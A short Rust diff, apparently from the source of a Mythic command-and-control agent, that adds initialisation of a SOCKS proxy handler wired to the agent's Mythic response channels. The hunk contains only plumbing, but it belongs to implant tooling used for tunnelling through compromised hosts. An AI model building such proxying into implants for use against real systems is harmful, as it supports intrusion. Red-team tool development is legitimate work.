@@ -79,6 +79,12 @@ pub extern "C" fn run_main() {
         );
         let (send_file_tx, get_file_tx) = utils::files::initialize();
 
+        // Initialize SOCKS proxy handler
+        commands::socks::initialize(
+            response_channels.from_mythic_socks_rx,
+            response_channels.to_mythic_socks_tx.clone(),
+        );
+
         tasks::initialize(tasks::TaskChannels {
             new_response_tx: response_channels.new_response_tx.clone(),
             send_file_to_mythic_tx: send_file_tx,
